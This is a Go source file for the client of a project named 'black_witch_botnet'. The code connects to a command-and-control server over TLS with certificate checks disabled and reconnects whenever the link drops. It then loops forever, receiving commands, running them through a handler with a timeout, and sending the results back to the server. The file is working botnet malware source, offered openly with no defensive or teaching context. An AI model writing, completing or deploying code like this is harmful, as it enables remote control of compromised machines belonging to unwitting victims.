package client

import (
	"black_witch_botnet/proto"
	"black_witch_botnet/relations"
	"crypto/tls"
	"log"
	"net"
	"time"
)

type Client struct {
	Addr       string
	Conn       net.Conn
	ReconnTime time.Duration
}

func (c *Client) Run() {
	c.connect()

	for {
		log.Print("*")
		iPack, err := c.read()

		if err != nil {
			log.Printf("Error read package %s\n", err)
			c.reconnect()
			continue
		}

		req, err := proto.Unmarshal(iPack)

		if err != nil {
			log.Printf("Error unmarshal package %s\n", err)
			continue
		}

		var res interface{}
		ch := make(chan struct{}, 1)

		go func() {
			res = c.handle(req)
			ch <- struct{}{}
		}()

		select {
		case <-ch:
		case <-time.After(10 * time.Second):
			res = &relations.ErrorResult{
				Code: relations.ErrorTimeout,
				Data: []byte("run command timeout"),
			}
		}

		oPack, err := proto.Marshal(res)

		if err != nil {
			log.Printf("Error marshal package %s\n", err)
			continue
		}

		err = c.write(oPack)

		if err != nil {
			log.Printf("Error write package %s\n", err)
			continue
		}
	}
}

func (c *Client) connect() {
	conn, err := c.dial()

	if err != nil {
		log.Println("[TCP] Dialing connection", err)
		c.reconnect()
		return
	}

	log.Printf("[TCP] Successfully connected %s", c.Addr)
	c.Conn = conn
}

func (c *Client) reconnect() {
	log.Printf("[*] Reconnecting in %d seconds\n", c.ReconnTime)
	time.Sleep(c.ReconnTime * time.Second)
	c.connect()
}

func (c *Client) dial() (*tls.Conn, error) {
	dialer := &net.Dialer{KeepAlive: 1 * time.Second}
	conf := &tls.Config{
		InsecureSkipVerify: true,
	}

	return tls.DialWithDialer(dialer, "tcp", c.Addr, conf)
}

func (c *Client) write(res *proto.Package) error {
	writer := proto.NewWriter(c.Conn)
	err := writer.Write(res)

	if err != nil {
		return err
	}

	return nil
}

func (c *Client) read() (*proto.Package, error) {
	reader := proto.NewReader(c.Conn)
	pack, err := reader.Read()

	if err != nil {
		return nil, err
	}

	return pack, nil
}

func (c *Client) handle(req interface{}) interface{} {
	h := Handler{req}
	return h.handle()
}
